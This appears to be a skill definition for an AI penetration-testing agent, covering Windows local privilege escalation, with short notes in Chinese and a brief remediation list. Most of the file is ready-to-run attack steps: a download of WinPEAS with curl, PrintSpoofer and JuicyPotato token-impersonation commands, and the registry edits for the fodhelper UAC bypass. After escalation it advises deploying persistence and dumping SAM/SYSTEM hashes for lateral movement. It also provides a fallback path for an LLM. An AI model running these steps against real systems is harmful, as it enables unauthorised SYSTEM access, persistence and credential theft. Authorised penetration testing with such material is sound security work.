---
name: windows-privesc
description: Enumerates and exploits Windows privilege escalation vectors including token impersonation (PrintSpoofer/JuicyPotato), UAC bypass, and service misconfigurations. Uses WinPEAS for automated enumeration.
skill_type: exploit
severity: critical
tags: [privesc, windows, printspoofer, juicypotato, uac-bypass, winpeas, privilege-escalation]
---

# Windows 本地提权

## Essential Principles
1. **令牌滥用**: SeImpersonatePrivilege → PrintSpoofer/JuicyPotato/GodPotato 以 SYSTEM 执行
2. **服务配置错误**: 可写服务二进制、未引号路径
3. **AlwaysInstallElevated**: 注册表开启 → 任何 MSI 以 SYSTEM 安装
4. **UAC 绕过**: fodhelper.exe 注册表劫持、ComputerDefaults 等
5. 优先用 `whoami /priv` + `systeminfo` 获取基线，WinPEAS 做深度枚举

## When to Use
- 已获得 Windows 系统命令执行（cmd/powershell）
- `whoami /priv` 显示 SeImpersonatePrivilege 已启用
- 需要从普通用户/Service 账户提权至 SYSTEM

## When NOT to Use
- 已经是 NT AUTHORITY\SYSTEM
- Linux 目标
- 无任何命令执行能力（纯文件读取）

## Path Selection
| 优先级 | 条件 | 路径 | 方法 |
|--------|------|------|------|
| 1 | SeImpersonatePrivilege Enabled | print_spoofer | PrintSpoofer64.exe -c "whoami" |
| 2 | SeImpersonatePrivilege + CLSID可用 | juicy_potato | JuicyPotato.exe 绕过 |
| 3 | 管理员但未提权 | uac_bypass | fodhelper.exe 注册表劫持 |
| 99 | 兜底 | llm_freeform | LLM 基于 WinPEAS 输出推理 |

## Key Commands
```bat
:: 特权枚举
whoami /priv

:: 系统信息
systeminfo

:: WinPEAS 自动化
curl -sL -o winpeas.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe
winpeas.exe systeminfo userinfo servicesinfo

:: PrintSpoofer
PrintSpoofer64.exe -c "whoami"

:: JuicyPotato
JuicyPotato.exe -l 1337 -p "cmd.exe /c whoami" -t *

:: UAC Bypass (fodhelper)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

## Post-Exploitation
- 成功后获得 NT AUTHORITY\SYSTEM shell
- 建议部署持久化（注册表 Run / 计划任务 / WMI）
- 导出 SAM/SYSTEM 哈希用于横向移动

## Remediation
1. 移除不必要的 SeImpersonatePrivilege 令牌
2. 修正未引号的服务路径
3. 禁用 AlwaysInstallElevated 注册表 (HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer)
4. 及时安装安全更新
5. 使用 LAPS 管理本地管理员密码
